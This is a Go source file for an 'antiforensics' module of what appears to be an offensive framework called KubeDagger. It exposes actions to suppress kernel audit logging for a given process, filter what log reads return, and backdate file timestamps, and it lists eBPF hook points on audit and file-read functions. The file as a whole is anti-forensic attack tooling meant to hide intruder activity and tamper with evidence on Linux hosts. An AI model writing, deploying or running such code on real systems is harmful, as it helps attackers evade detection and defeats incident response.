package modules

import (
	"context"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/yasindce1998/KubeDagger/pkg/antiforensics"
)

type AntiForensics struct{}

func (m *AntiForensics) Name() string      { return "antiforensics" }
func (m *AntiForensics) Platform() []string { return []string{"linux"} }

func (m *AntiForensics) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	action := args["action"]
	if action == "" {
		action = "status"
	}

	ctrl := antiforensics.NewController()

	switch action {
	case "suppress_pid":
		return m.suppressPID(ctrl, args)
	case "filter_log":
		return m.filterLog(ctrl, args)
	case "wipe_timestamps":
		return m.wipeTimestamps(ctrl, args)
	case "status":
		return m.status(ctrl)
	default:
		return nil, fmt.Errorf("unknown action: %s (valid: suppress_pid, filter_log, wipe_timestamps, status)", action)
	}
}

func (m *AntiForensics) suppressPID(ctrl *antiforensics.Controller, args map[string]string) (*Result, error) {
	pidStr := args["pid"]
	if pidStr == "" {
		return &Result{Success: false, Error: "pid argument required"}, nil
	}

	pid, err := strconv.ParseUint(pidStr, 10, 32)
	if err != nil {
		return &Result{Success: false, Error: fmt.Sprintf("invalid pid: %v", err)}, nil
	}

	if err := ctrl.SuppressAuditForPID(uint32(pid)); err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{
		Success: true,
		Output:  fmt.Sprintf("audit suppression configured for PID %d", pid),
	}, nil
}

func (m *AntiForensics) filterLog(ctrl *antiforensics.Controller, args map[string]string) (*Result, error) {
	path := args["path"]
	pattern := args["pattern"]
	if path == "" || pattern == "" {
		return &Result{Success: false, Error: "path and pattern arguments required"}, nil
	}

	if err := ctrl.FilterLogReads(path, pattern); err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{
		Success: true,
		Output:  fmt.Sprintf("log filter configured: path=%s pattern=%s", path, pattern),
	}, nil
}

func (m *AntiForensics) wipeTimestamps(ctrl *antiforensics.Controller, args map[string]string) (*Result, error) {
	pathsStr := args["paths"]
	if pathsStr == "" {
		return &Result{Success: false, Error: "paths argument required (comma-separated)"}, nil
	}

	paths := strings.Split(pathsStr, ",")

	targetStr := args["target_time"]
	var target time.Time
	if targetStr != "" {
		var err error
		target, err = time.Parse(time.RFC3339, targetStr)
		if err != nil {
			return &Result{Success: false, Error: fmt.Sprintf("invalid target_time: %v", err)}, nil
		}
	} else {
		target = time.Now().Add(-30 * 24 * time.Hour)
	}

	modified, err := ctrl.WipeTimestamps(paths, target)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{
		Success: true,
		Output:  fmt.Sprintf("timestamps modified: %d/%d files", modified, len(paths)),
	}, nil
}

func (m *AntiForensics) status(_ *antiforensics.Controller) (*Result, error) {
	return &Result{
		Success: true,
		Output:  "antiforensics module ready\ncapabilities: suppress_pid, filter_log, wipe_timestamps\nhook_points: kprobe/audit_log_start, kretprobe/vfs_read, kprobe/utimensat",
	}, nil
}
